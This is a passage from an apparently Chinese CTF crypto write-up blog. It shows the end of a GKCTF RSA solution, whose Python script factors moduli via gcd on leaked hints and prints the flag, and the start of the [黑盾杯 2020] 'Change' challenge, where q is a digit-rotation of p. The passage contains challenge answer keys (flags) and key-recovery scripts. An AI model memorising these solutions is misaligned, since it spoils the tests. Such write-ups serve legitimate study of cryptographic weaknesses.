class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo>−</mo><mn>212121</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>2020</mn><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><mn>2121</mn><mo>∗</mo><msub><mi>p</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>202020</mn></msup></mrow><annotation encoding="application/x-tex">((hint2-212121)*2020)^{202020}=(2020*2121*p_1)^{202020}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>两式相减可以得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo>−</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">(k_1-k_2)*q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>跟n求gcd即可得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><h3 id="求解q"><a class="markdownIt-Anchor" href="#求解q"></a> 求解q：</h3><p>原理同上</p><h2 id="exp-11"><a class="markdownIt-Anchor" href="#exp-11"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>c=<span class="hljs-number">13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758</span><br>n1=<span class="hljs-number">75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829</span><br>c1=<span class="hljs-number">68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569</span><br>hint1=<span class="hljs-number">23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951</span><br>hint2=<span class="hljs-number">52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270</span><br>n2=<span class="hljs-number">114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489</span><br>c2=<span class="hljs-number">67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004</span><br>hint3=<span class="hljs-number">25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077</span><br>hint4=<span class="hljs-number">104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513</span><br>e=<span class="hljs-number">65537</span><br><span class="hljs-comment">#一</span><br>q1=gcd(n1,(hint1*(<span class="hljs-number">2021</span>**<span class="hljs-number">202020</span>)-<span class="hljs-built_in">pow</span>((hint2-<span class="hljs-number">212121</span>)*<span class="hljs-number">2020</span>,<span class="hljs-number">202020</span>,n1)))<br>p1=n1//q1<br><br>p=<span class="hljs-built_in">pow</span>(c1,invert(e,(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)),n1)<br><br><span class="hljs-comment">#二</span><br>q2=gcd(n2,<span class="hljs-built_in">pow</span>(hint3*<span class="hljs-number">2021</span>**<span class="hljs-number">202020</span>,<span class="hljs-number">212121</span>,n2)-<span class="hljs-built_in">pow</span>(hint4*<span class="hljs-number">2020</span>**<span class="hljs-number">212121</span>,<span class="hljs-number">202020</span>,n2))<br>p2=n2//q2<br><br>q=<span class="hljs-built_in">pow</span>(c2,invert(e,(p2-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)),n2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),p*q)))<br><span class="hljs-comment">#b&#x27;GKCTF&#123;f64310b5-d5e6-45cb-ae69-c86600cdf8d8&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;f64310b5-d5e6-45cb-ae69-c86600cdf8d8&#125;</span><br></code></pre></td></tr></table></figure><h1 id="黑盾杯-2020change"><a class="markdownIt-Anchor" href="#黑盾杯-2020change"></a> [黑盾杯 2020]Change</h1><h2 id="题目-12"><a class="markdownIt-Anchor" href="#题目-12"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> FLAG<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = <span class="hljs-built_in">int</span>(gmpy2.next_prime(random.randint(<span class="hljs-number">10</span>**<span class="hljs-number">399</span>, <span class="hljs-number">10</span>**<span class="hljs-number">400</span>-<span class="hljs-number">1</span>)))<br>    q = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p)[<span class="hljs-number">200</span>:]+<span class="hljs-built_in">str</span>(p)[:<span class="hljs-number">200</span>])<br>    <span class="hljs-keyword">if</span> gmpy2.is_prime(q):<br>        <span class="hljs-keyword">break</span><br><br>m = bytes_to_long(FLAG)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;enc&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">str</span>(c))<br>    f.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(n))<br><span class="hljs-comment">#182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span><br><span class="hljs-comment">#438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span><br></code></pre></td></tr></table></figure><h2 id="分析-12"><a class="markdownIt-Anchor" href="#分析-12"></a> 分析</h2><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo>=</mo><msub><mi>p</mi><mi>h</mi></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>+</mo><msub><mi>p</mi><mi>l</mi></msub><mspace linebreak="newline"></mspace><mi>q</mi><mo>=</mo><msub><mi>p</mi><mi>l</mi></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>+</mo><msub><mi>p</mi><mi>h</mi></msub><mspace linebreak="newline"></mspace><mi>n</mi><mo>=</mo><mn>1</mn><msup><mn>0</mn><mn>400</mn></msup><mo>∗</mo><msub><mi>p</mi><mi>h</mi></msub><mo>∗</mo><msub><mi>p</mi><mi>l</mi></msub><mo>+</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>∗</mo><msubsup><mi>p</mi><mi>h</mi><mn>2</mn></msubsup><mo>+</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>∗</mo><msubsup><mi>p</mi><mi>l</mi><mn>2</mn></msubsup><mo>+</mo><msub><mi>p</mi><mi>h</mi></msub><mo>∗</mo><msub><mi>p</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">p=p_h*10^{200}+p_l \\q=p_l*10^{200}+p_h \\n=10^{400}*p_h*p_l+10^{200}*p_h^2+10^{200}*p_l^2+p_h*p_l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span 